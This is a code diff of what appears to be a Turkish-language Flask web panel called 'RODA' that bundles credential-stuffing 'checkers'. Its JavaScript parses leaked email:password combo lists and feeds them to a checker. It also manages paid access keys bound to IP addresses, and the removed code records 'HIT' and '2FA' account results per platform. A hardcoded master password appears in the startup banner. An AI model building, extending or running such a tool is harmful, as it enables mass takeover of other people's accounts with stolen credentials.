+            var parts=line.split(":");var first=parts[0].trim();var password=parts.slice(1).join(":").trim();if(!password)return;
+            if(mode==="email"){if(regex.test(first))result.push(first+":"+password);}
+            else{if(!regex.test(first))result.push(first+":"+password);}
+        }
+    });
+    var container=document.getElementById("parseResult");
+    if(result.length===0){container.innerHTML='<div style="color:var(--muted);font-size:13px;padding:10px">Geçerli satır bulunamadı.</div>';}
+    else{
+        var html='<div class="parse-count">'+result.length+' satır bulundu</div>';
+        result.forEach(function(line){html+='<div class="parse-line">'+line+'</div>';});
+        container.innerHTML=html;
+    }
+    document.getElementById("parseCount").innerText=result.length+" satır";
+    document.getElementById("parseValid").innerText=result.length+" geçerli";
+}
+function parseToChecker(){
+    var result=[];var items=document.querySelectorAll("#parseResult .parse-line");
+    items.forEach(function(item){result.push(item.innerText);});
+    if(result.length===0){alert("Önce ayrıştırma yapın!");return;}
+    document.getElementById("checkerCombo").value=result.join("\n");
+    alert(result.length+" satır Checker'a aktarıldı!");
+}
+function clearParse(){
+    document.getElementById("parseInput").value="";
+    document.getElementById("parseResult").innerHTML='<div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div>';
+    document.getElementById("parseCount").innerText="0 satır";
+    document.getElementById("parseValid").innerText="0 geçerli";
+}
+function loadParseFile(){
+    var input=document.createElement("input");input.type="file";input.accept=".txt";
+    input.onchange=function(e){
+        var file=e.target.files[0];if(!file)return;
+        var reader=new FileReader();
+        reader.onload=function(event){document.getElementById("parseInput").value=event.target.result;parseData();};
+        reader.readAsText(file);
+    };
+    input.click();
+}
+
+function refreshLogs(){
+    if(!isAdmin)return;
+    fetch("/api/logs?key="+encodeURIComponent(currentKey)).then(r=>r.json()).then(d=>{
+        if(d.error){alert(d.error);return;}
+        var container=document.getElementById("logsContainer");
+        var html=d.logs.map(function(log){
+            var color=log.level==="ERROR"?"var(--r)":(log.level==="SUCCESS"?"var(--g)":"var(--muted)");
+            return '<div style="padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.03);color:'+color+'">['+log.timestamp+'] '+log.message+'</div>';
+        }).join('');
+        container.innerHTML=html||'<div style="color:var(--muted)">Henüz log yok.</div>';
     });
 }
 
-function loadHitFilter() {
-    var sel = document.getElementById("hitPlatformFilter");
-    sel.innerHTML = '<option value="all">Tüm Platformlar</option>';
-    platforms.forEach(function(p){ var opt = document.createElement("option"); opt.value = p.name; opt.text = p.name; sel.appendChild(opt); });
-}
-
-function addHit(platform, email, password, status, details) {
-    if (!hitData[platform]) hitData[platform] = { hits: [], twofa: [] };
-    var entry = { email: email, password: password, time: new Date().toLocaleString(), details: details || {} };
-    if (status === "HIT") hitData[platform].hits.push(entry);
-    else if (status === "2FA") hitData[platform].twofa.push(entry);
-    renderHits();
-}
-
-function renderHits() {
-    var filter = document.getElementById("hitPlatformFilter").value;
-    var hitContainer = document.getElementById("hitList");
-    var twofaContainer = document.getElementById("twofaList");
-    var hits = [], twofas = [];
-    if (filter === "all") {
-        for (var p in hitData) {
-            if (hitData[p].hits) hitData[p].hits.forEach(function(h){ hits.push({ platform: p, email: h.email, password: h.password, time: h.time }); });
-            if (hitData[p].twofa) hitData[p].twofa.forEach(function(t){ twofas.push({ platform: p, email: t.email, password: t.password, time: t.time }); });
+function loadKeys(){
+    if(!isAdmin)return;
+    fetch("/api/admin/keys?key="+encodeURIComponent(currentKey)).then(r=>r.json()).then(d=>{
+        if(d.error){alert(d.error);return;}
+        var list=document.getElementById("keyList");
+        var html="";
+        for(var k in d){
+            var v=d[k];
+            var exp=v.expires?new Date(v.expires).toLocaleString():"Süresiz";
+            var ip=v.bound_ip||"Bağlanmamış";
+            var used=v.used?"✅ Kullanıldı":"❌ Kullanılmadı";
+            html+='<div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)"><div><strong style="font-size:13px">'+k+'</strong><br><small style="color:var(--muted);font-size:10px">'+v.note+' | '+exp+' | IP: '+ip+' | '+used+'</small></div><button class="btn sm r" onclick="deleteKey(\''+k+'\')" style="padding:3px 10px;font-size:10px">Sil</button></div>';
         }
-    } else {
-        if (hitData[filter]) {
-            if (hitData[filter].hits) hitData[filter].hits.forEach(function(h){ hits.push({ platform: filter, email: h.email, password: h.password, time: h.time }); });
-            if (hitData[filter].twofa) hitData[filter].twofa.forEach(function(t){ twofas.push({ platform: filter, email: t.email, password: t.password, time: t.time }); });
-        }
-    }
-    hitContainer.innerHTML = hits.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz HIT yok.</div>' :
-        hits.map(function(h){ return '<div class="hit-item"><span class="hit-email">[' + h.platform + '] ' + h.email + ' | ' + h.password + '</span><span class="hit-time">' + h.time + '</span></div>'; }).join('');
-    twofaContainer.innerHTML = twofas.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div>' :
-        twofas.map(function(t){ return '<div class="hit-item"><span class="hit-email">[' + t.platform + '] ' + t.email + ' | ' + t.password + '</span><span class="hit-time">' + t.time + '</span></div>'; }).join('');
+        list.innerHTML=html||'<p style="color:var(--muted);font-size:12px">Hiç key yok.</p>';
+    });
 }
+function generateKey(){
+    if(!isAdmin)return;
+    var note=document.getElementById("genNote").value||"Oluşturuldu";
+    var hours=document.getElementById("genHours").value;
+    fetch("/api/admin/generate",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({master_key:currentKey,note:note,hours:hours})})
+    .then(r=>r.json()).then(d=>{
+        if(d.success){alert("Key Oluşturuldu!\n\nKey: "+d.key+"\nBitiş: "+d.expires);loadKeys();}
+        else alert("Başarısız: "+(d.error||""));
+    });
+}
+function deleteKey(target){
+    if(!isAdmin)return;
+    if(!confirm("Bu anahtarı sil?"))return;
+    fetch("/api/admin/delete",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({master_key:currentKey,target_key:target})})
+    .then(r=>r.json()).then(d=>{if(d.success)loadKeys();else alert("Silinemedi");});
+}
+</script>
+</body>
+</html>
+"""
 
-function clearHits() {
-    if (!confirm("Tüm HIT ve 2FA kayıtları silinecek. Devam?")) return;
-    hitData = {}; renderHits();
-}
-
-function resetCheckerStats() {
-    document.getElementById("chkTotal").innerText = 0;
-    document.getElementById("chkHit").innerText = 0;
-    document.getElementById("chkBad").innerText = 0;
-    document.getElementById("chk2fa").innerText = 0;
-    document.getElementById("chkError").innerText = 0;
-    document.getElementById("chkRemaining").innerText = 0;
-}
-function updateRemaining() {
-    var remaining = totalLines - processedCount;
-    document.getElementById("chkRemaining").innerText = remaining < 0 ? 0 : remaining;
-}
-
-function startChecker() {
-    if (checkerRunning) return;
-    var comboText = document.getElementById("checkerCombo").value.trim();
-    if (!comboText) return alert("Combo girin (email:password)");
-    if (!currentPlatform) return alert("Önce bir platform seçin");
-    checkerRunning = true;
-    document.getElementById("checkerStartBtn").disabled = true;
-    document.getElementById("checkerStopBtn").style.display = "inline-block";
-    document.getElementById("checkerResults").innerHTML = "";
-    var lines = comboText.split("\n").filter(function(l){ return l.includes(":"); });
-    totalLines = lines.length;
-    processedCount = 0
+# ============================================================
+# BAŞLAT
+# ============================================================
+if __name__ == "__main__":
+    if not os.path.exists(KEYS_FILE):
+        save_keys({})
+    port = int(os.environ.get("PORT", 5000))
+    print("""
+    ╔══════════════════════════════════════════════════════════════════╗
+    ║     🔱 RODA - TÜM CHECKER'LAR TEK YERDE                        ║
+    ║     http://0.0.0.0:""" + str(port) + """                               ║
+    ║     Giriş: Roda@2026#Secure!X7                                ║
+    ║     Kar taneleri, 1 Key 1 IP, Loglar                         ║
+    ╚══════════════════════════════════════════════════════════════════╝
+    """)
+    app.run(host="0.0.0.0", port=port, debug=False)
